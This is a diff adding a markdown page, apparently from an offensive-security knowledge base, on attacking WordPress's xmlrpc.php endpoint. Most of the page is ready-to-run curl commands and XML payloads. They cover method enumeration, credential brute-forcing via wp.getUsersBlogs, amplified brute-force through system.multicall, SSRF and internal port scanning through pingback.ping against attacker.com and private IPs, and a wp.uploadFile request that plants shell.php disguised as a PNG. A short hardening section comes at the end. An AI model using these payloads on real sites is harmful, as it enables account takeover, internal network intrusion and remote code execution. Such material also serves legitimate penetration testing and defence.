@@ -1,0 +1,384 @@
+---
+title: XML-RPC Abuse
+description: The xmlrpc.php endpoint as an unauthenticated attack surface - method enumeration via system.listMethods, brute-force amplification via system.multicall, credential validation via wp.getUsersBlogs, and SSRF via pingback.ping.
+mitre: [T1190, T1110.001, T1110.003, T1071.001]
+d3fend: [D3-NTA]
+impact: [CredentialTheft, InternalAccess]
+sidebar:
+  order: 6
+  label: XML-RPC Abuse
+---
+
+## TL;DR
+
+WordPress's `xmlrpc.php` is an XML-RPC API endpoint that predates the modern REST API but is still enabled on most installs because many plugins (Jetpack, WordPress mobile apps, Akismet, IFTTT integrations) depend on it. From an operator perspective, `xmlrpc.php` offers four primitives that `wp-login.php` doesn't:
+
+```
+# 1. Enumerate the available methods
+curl -sX POST -d '<?xml version="1.0"?>
+<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>' \
+  http://target/xmlrpc.php
+
+# 2. Brute-force credentials (no CAPTCHA, no rate limit by default)
+curl -sX POST -d '<?xml version="1.0"?>
+<methodCall><methodName>wp.getUsersBlogs</methodName>
+<params><param><value>admin</value></param><param><value>password</value></param></params>
+</methodCall>' \
+  http://target/xmlrpc.php
+
+# 3. Amplify brute-force via system.multicall (1 HTTP request = many login attempts)
+curl -sX POST -d '<?xml version="1.0"?>
+<methodCall><methodName>system.multicall</methodName>...</methodCall>' \
+  http://target/xmlrpc.php
+
+# 4. SSRF via pingback.ping - make WordPress connect to an arbitrary URL
+curl -sX POST -d '<?xml version="1.0"?>
+<methodCall><methodName>pingback.ping</methodName>
+<params><param><value>http://internal-host:8080/</value></param>
+<param><value>http://target/?p=1</value></param></params>
+</methodCall>' \
+  http://target/xmlrpc.php
+```
+
+Success indicator: `system.listMethods` returns the method list (confirms XML-RPC enabled); `wp.getUsersBlogs` with valid creds returns an `isAdmin` struct; `pingback.ping` makes an outbound connection visible in your callback listener.
+
+## When XML-RPC is reachable
+
+XML-RPC is enabled by default on a fresh WordPress install. Check with a simple GET:
+
+```shell
+curl -sI http://target/xmlrpc.php
+```
+
+```
+HTTP/1.1 405 Method Not Allowed
+Allow: POST
+Server: Apache/2.4.41
+```
+
+405 with `Allow: POST` confirms the endpoint exists and only accepts POST. A 404 means it's been deleted or rewritten away - some hardening guides recommend this.
+
+A 403 means a security plugin or web server rule is blocking access. Wordfence has an "Disable XML-RPC" option that returns 403; iThemes Security similarly.
+
+When XML-RPC is reachable, every method described below works without authentication for the method-discovery step; methods that need credentials enforce them per-method.
+
+## Method enumeration
+
+The `system.listMethods` method returns every XML-RPC method the server exposes:
+
+```shell
+curl -sX POST -d '<?xml version="1.0"?>
+<methodCall>
+  <methodName>system.listMethods</methodName>
+  <params></params>
+</methodCall>' http://target/xmlrpc.php
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<methodResponse>
+  <params>
+    <param>
+      <value>
+        <array>
+          <data>
+            <value><string>system.multicall</string></value>
+            <value><string>system.listMethods</string></value>
+            <value><string>system.getCapabilities</string></value>
+            <value><string>demo.addTwoNumbers</string></value>
+            <value><string>demo.sayHello</string></value>
+            <value><string>pingback.extensions.getPingbacks</string></value>
+            <value><string>pingback.ping</string></value>
+            <value><string>mt.publishPost</string></value>
+            <value><string>mt.getRecentPostTitles</string></value>
+            <value><string>mt.getCategoryList</string></value>
+            <value><string>mt.getPostCategories</string></value>
+            <value><string>mt.setPostCategories</string></value>
+            <value><string>mt.supportedMethods</string></value>
+            <value><string>mt.supportedTextFilters</string></value>
+            <value><string>mt.getTrackbackPings</string></value>
+            <value><string>metaWeblog.newPost</string></value>
+            <value><string>metaWeblog.editPost</string></value>
+            <value><string>metaWeblog.getPost</string></value>
+            <value><string>metaWeblog.getRecentPosts</string></value>
+            <value><string>metaWeblog.getCategories</string></value>
+            <value><string>metaWeblog.newMediaObject</string></value>
+            <value><string>blogger.newPost</string></value>
+            <value><string>blogger.editPost</string></value>
+            <value><string>blogger.deletePost</string></value>
+            <value><string>blogger.getUsersBlogs</string></value>
+            <value><string>blogger.getUserInfo</string></value>
+            <value><string>wp.getUsersBlogs</string></value>
+            <value><string>wp.newPost</string></value>
+            <value><string>wp.editPost</string></value>
+            <value><string>wp.deletePost</string></value>
+            <value><string>wp.getPosts</string></value>
+            <value><string>wp.uploadFile</string></value>
+            ...
+          </data>
+        </array>
+      </value>
+    </param>
+  </params>
+</methodResponse>
+```
+
+The method count varies (~70 in core WordPress; plugins like Jetpack add more). Methods worth recognizing:
+
+| Method | What it does | Notes |
+| --- | --- | --- |
+| `system.listMethods` | Lists all methods | No auth |
+| `system.multicall` | Bundle multiple method calls in one HTTP request | No auth wrapper; per-call auth applies |
+| `pingback.ping` | Send a pingback notification | No auth → SSRF |
+| `pingback.extensions.getPingbacks` | List pingbacks for a URL | Sometimes leaks internal post info |
+| `wp.getUsersBlogs` | Returns the blogs a user has access to | Credential validation primitive |
+| `wp.getPosts` | Get posts (with optional auth) | Sometimes reveals draft posts |
+| `wp.uploadFile` | Upload media | Author-or-above role required → file upload attack surface |
+| `wp.newPost` / `wp.editPost` | Create/edit posts | Author-or-above |
+| `metaWeblog.newMediaObject` | Alternate upload | Author-or-above |
+
+## Credential validation / brute-force
+
+The classic XML-RPC brute-force uses `wp.getUsersBlogs`. The method takes a username and password and returns the blogs the user has access to (or an error if creds are wrong).
+
+```shell
+curl -sX POST -d '<?xml version="1.0"?>
+<methodCall>
+  <methodName>wp.getUsersBlogs</methodName>
+  <params>
+    <param><value>admin</value></param>
+    <param><value>CorrectPassword</value></param>
+  </params>
+</methodCall>' http://target/xmlrpc.php
+```
+
+Successful response:
+
+```xml
+<methodResponse>
+  <params>
+    <param>
+      <value>
+        <array>
+          <data>
+            <value>
+              <struct>
+                <member><name>isAdmin</name><value><boolean>1</boolean></value></member>
+                <member><name>url</name><value><string>http://target/</string></value></member>
+                <member><name>blogid</name><value><string>1</string></value></member>
+                <member><name>blogName</name><value><string>InlaneFreight</string></value></member>
+                <member><name>xmlrpc</name><value><string>http://target/xmlrpc.php</string></value></member>
+              </struct>
+            </value>
+          </data>
+        </array>
+      </value>
+    </param>
+  </params>
+</methodResponse>
+```
+
+Failed response (wrong credentials):
+
+```xml
+<methodResponse>
+  <fault>
+    <value>
+      <struct>
+        <member><name>faultCode</name><value><int>403</int></value></member>
+        <member><name>faultString</name><value><string>Incorrect username or password.</string></value></member>
+      </struct>
+    </value>
+  </fault>
+</methodResponse>
+```
+
+The differential is clear: response contains `<isAdmin>` → success; response contains `<faultCode>403</faultCode>` → fail.
+
+### Why this matters vs. wp-login.php brute-force
+
+- **No CAPTCHA.** `wp-login.php` can have CAPTCHA via plugins; `xmlrpc.php` typically doesn't.
+- **No CSRF token.** `wp-login.php` may require a nonce; `xmlrpc.php` doesn't.
+- **Sometimes no rate limiting.** Many security plugins (especially older versions) protect `wp-login.php` but ignore `xmlrpc.php`. Hardening evolution has closed this gap somewhat but it's still common in older installs.
+- **`isAdmin` field tells you about role privilege immediately.** Authors and editors will succeed too - useful for finding any-role-with-some-access accounts.
+
+WPScan uses this method when `--password-attack xmlrpc` is selected - see [Login brute-force](/codex/web/wordpress/login-bruteforce/).
+
+## Amplification via system.multicall
+
+`system.multicall` accepts an array of method calls and executes them in a single HTTP request:
+
+```xml
+<?xml version="1.0"?>
+<methodCall>
+  <methodName>system.multicall</methodName>
+  <params>
+    <param>
+      <value>
+        <array>
+          <data>
+            <value><struct>
+              <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
+              <member><name>params</name><value>
+                <array><data>
+                  <value><array><data>
+                    <value><string>admin</string></value>
+                    <value><string>password1</string></value>
+                  </data></array></value>
+                </data></array>
+              </value></member>
+            </struct></value>
+            <value><struct>
+              <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
+              <member><name>params</name><value>
+                <array><data>
+                  <value><array><data>
+                    <value><string>admin</string></value>
+                    <value><string>password2</string></value>
+                  </data></array></value>
+                </data></array>
+              </value></member>
+            </struct></value>
+            <!-- repeat for many passwords -->
+          </data>
+        </array>
+      </value>
+    </param>
+  </params>
+</methodCall>
+```
+
+Each inner struct is one method call. The server processes them sequentially and returns an array of results.
+
+**Operational impact:** one HTTP request can contain ~hundreds of brute-force attempts. From a defender's perspective looking at HTTP request rate, it's a single request - much harder to rate-limit than 100 separate POSTs to `wp-login.php`. WordPress added a limit (~150 calls per multicall) in 4.4 but many installs run older versions.
+
+The response is a long XML array. Parsing it for successes:
+
+```shell
+# Extract just the successful (isAdmin) responses
+curl -sX POST -d "@multicall_payload.xml" http://target/xmlrpc.php \
+  | grep -B1 -A20 'isAdmin' \
+  | grep -E '<string>password|<boolean>1'
+```
+
+## SSRF via pingback.ping
+
+The `pingback.ping` method is intended to notify a third-party blog that you've linked to one of its posts. It takes two arguments: the source URL (your blog post) and the target URL (the post you linked to).
+
+What it actually does on the server side: WordPress fetches the source URL via HTTP to verify the link exists. **The source URL can be anywhere - including internal hosts the target server can reach but you can't.**
+
+```shell
+curl -sX POST -d '<?xml version="1.0"?>
+<methodCall>
+  <methodName>pingback.ping</methodName>
+  <params>
+    <param><value><string>http://attacker.com/callback</string></value></param>
+    <param><value><string>http://target/?p=1</string></value></param>
+  </params>
+</methodCall>' http://target/xmlrpc.php
+```
+
+If `attacker.com/callback` receives an inbound HTTP request shortly afterward, the SSRF works. The User-Agent will be `WordPress/X.Y.Z; http://target/...` - clearly identifies it.
+
+### Using SSRF for internal scanning
+
+Replace the source URL with internal addresses:
+
+```shell
+# Probe an internal web service
+curl -sX POST -d '<?xml version="1.0"?>
+<methodCall>
+  <methodName>pingback.ping</methodName>
+  <params>
+    <param><value><string>http://10.0.0.5:8080/admin</string></value></param>
+    <param><value><string>http://target/?p=1</string></value></param>
+  </params>
+</methodCall>' http://target/xmlrpc.php
+```
+
+Response patterns (in the `faultString` field):
+
+| Fault content | What it means |
+| --- | --- |
+| `The source URL does not contain a link to the target URL` | Internal host returned content but no link → host is up, port is open, returns content |
+| `is not a valid URL` | Malformed URL on your end |
+| `couldn't open` (or similar timeout) | Connection refused or timeout → port closed or filtered |
+| `Pingback already registered` | The pingback already fired once (you'll get this on retries) |
+
+The differential between "fetched something" and "couldn't fetch anything" is the port-scan oracle.
+
+### Why this still works
+
+WordPress disabled the source-port discovery aspect of pingback but the URL-fetch behavior remains intact because it's required for legitimate pingback functionality. Mitigations exist:
+
+- WordPress 3.5.1 added Akismet integration that filters pingbacks
+- Hosting providers sometimes filter outbound HTTP from WordPress
+- Plugins like Wordfence can disable `pingback.ping` specifically
+
+When pingback SSRF is alive, it's a useful internal-network probe. See the [SSRF cluster](/codex/web/server-side/ssrf/) for the broader context on SSRF primitives.
+
+### Reflective DoS via pingback
+
+Multiple WordPress sites with `pingback.ping` open can be coerced into hammering a third-party target - many sources, one victim. Historically used in DDoS amplification.
+
+This is out of scope for offensive pentest work (DoS testing requires explicit permission and is rarely useful for defensive value), but it's the reason WordPress.com disabled pingbacks across the board in 2014 and the reason hardening guides recommend disabling them.
+
+## Other useful XML-RPC methods
+
+### `wp.uploadFile` - authenticated arbitrary upload
+
+Once you have credentials (any role above Subscriber), this method uploads a file to `wp-content/uploads/`:
+
+```xml
+<?xml version="1.0"?>
+<methodCall>
+  <methodName>wp.uploadFile</methodName>
+  <params>
+    <param><value><string>1</string></value></param>             <!-- blog_id -->
+    <param><value><string>username</string></value></param>
+    <param><value><string>password</string></value></param>
+    <param>
+      <value>
+        <struct>
+          <member><name>name</name><value><string>shell.php</string></value></member>
+          <member><name>type</name><value><string>image/png</string></value></member>
+          <member><name>bits</name><value><base64>BASE64_ENCODED_PHP_HERE</base64></value></member>
+          <member><name>overwrite</name><value><boolean>0</boolean></value></member>
+        </struct>
+      </value>
+    </param>
+  </params>
+</methodCall>
+```
+
+WordPress validates `name` extensions against a whitelist; `.php` is rejected. But the validation has historically had bypass techniques (double extensions, null byte injection in old WP, custom upload-handler plugins that don't validate). See the [file upload cluster](/codex/web/uploads/) for bypass techniques.
+
+When `wp.uploadFile` is reachable with author-level credentials, it's an Author → RCE path that doesn't require the admin theme editor.
+
+### `metaWeblog.newPost` - authenticated post creation
+
+Lets you create posts as the authenticated user. Less directly useful for RCE but useful for:
+
+- Posting content that triggers stored XSS to other users
+- Embedding shortcodes that execute server-side code (if a vulnerable plugin registers such a shortcode)
+
+## Hardening responses
+
+WordPress lets admins disable XML-RPC. Common approaches:
+
+1. **Block the endpoint at the web server level** - `.htaccess` or nginx rule denying `xmlrpc.php`
+2. **Disable XML-RPC via plugin** - Wordfence, iThemes Security, "Disable XML-RPC" plugin
+3. **Filter specific methods** - `xmlrpc_methods` WordPress filter removes individual methods (e.g., `pingback.ping`) while leaving others
+
+When XML-RPC returns 403/404, fall back to `wp-login.php` for brute-force and to other SSRF primitives for internal probes.
+
+## Quick reference
+
+| Task | Body of POST to xmlrpc.php |
+| --- | --- |
+| Check endpoint | `curl -sI http://target/xmlrpc.php` (expect 405 with `Allow: POST`) |
+| List all methods | `<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>` |
+| Test credentials | `<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>USER</value></param><param><value>PASS</value></param></params></methodCall>` |
+| Amplified brute-force | `<methodCall><methodName>system.multicall</methodName>...</methodCall>` with N wp.getUsersBlogs structs |
+| SSRF / port probe | `<methodCall><methodName>pingback.ping</methodName><params><param><value>http://INTERNAL/</value></param><param><value>http://target/?p=1</value></param></params></methodCall>` |
+| Authenticated upload | `<methodCall><methodName>wp.uploadFile</methodName>...</methodCall>` |
